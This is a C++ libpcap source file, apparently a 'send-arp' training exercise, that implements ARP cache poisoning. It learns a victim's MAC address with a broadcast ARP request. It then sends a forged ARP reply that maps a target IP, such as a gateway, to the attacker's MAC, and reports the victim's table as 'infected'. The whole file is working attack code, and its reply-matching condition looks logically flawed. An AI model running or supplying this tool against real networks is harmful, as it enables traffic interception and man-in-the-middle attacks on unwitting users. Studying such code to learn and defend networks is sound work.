#include "pch.h"
#include <cstdio>
#include <iostream>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void print_addr(std::string label, Ip& ip, Mac& mac ) {
    std::cout << "------------" << label << "------" << std::endl;
    std::cout << "  IP : " << std::string(ip) << std::endl;
    std::cout << "  MAC: " << std::string(mac) << std::endl;
    std::cout << "----------------------------------" << std::endl;
}

void load_addr(char* dev, Ip& ip, Mac& mac){
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd == -1) {
        perror("socket");
        exit(1);
    }
    
    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev); 
    if (ioctl(sfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl");
        close(sfd);
        exit(1);
    }
    ip = Ip(ntohl(((sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
    
    if (ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sfd);
        exit(1);
    }
    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    close(sfd);
}

int attack(char* dev, char* sender, char* target){

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Ip aip,sip=Ip(sender),tip=Ip(target);
    Mac amac,smac,tmac;

    /* Load Attacker IP & MAC Addr */
    load_addr(dev,aip, amac);
    print_addr("Attacker",aip,amac);


    /* Find Sender Mac Addr */
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(amac); // Attacker MAC
    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);
    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::OP_REQUEST);
    packet.arp_.smac_ = Mac(amac); // Attacker MAC
    packet.arp_.sip_ = htonl(aip); // Attacker IP
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(sip); // Sender IP

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    while(1) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        EthHdr* eth_hdr = (EthHdr*)packet;
        ArpHdr* arp_hdr = (ArpHdr*)(eth_hdr + 1);
        if (eth_hdr->type() == EthHdr::ETHERTYPE_ARP || arp_hdr->op() != ArpHdr::OP_REPLY || arp_hdr->sip()==sip) {
            smac = arp_hdr->smac();
            printf("\n\n****Sender Mac Addr Capture Success!****\n\n");
            break;
        }
    }
    print_addr("Sender",sip,smac);

    //////////////////////////////////////
    ////////// ARP Table Attack //////////
    //////////////////////////////////////

    // EthArpPacket packet;
    packet.eth_.dmac_ = Mac(smac); // Sender Mac
    packet.eth_.smac_ = Mac(amac); // Attacker Mac
    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);

    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::OP_REPLY);
    packet.arp_.smac_ = amac; // Attacker Mac
    packet.arp_.sip_ = htonl(tip); // Target IP
    packet.arp_.tmac_ = smac; // Sender Mac
    packet.arp_.tip_ = htonl(sip); // Sender IP


    res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    printf("\n\n****Sender's ARP Table is Infected!****\n\n");

    pcap_close(pcap);
    return 0;
}


void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    int ret = 0;
    for(int i = 2; i < argc; i += 2) {
        ret += attack(argv[1], argv[i], argv[i+1]);

    }
    return ret;
}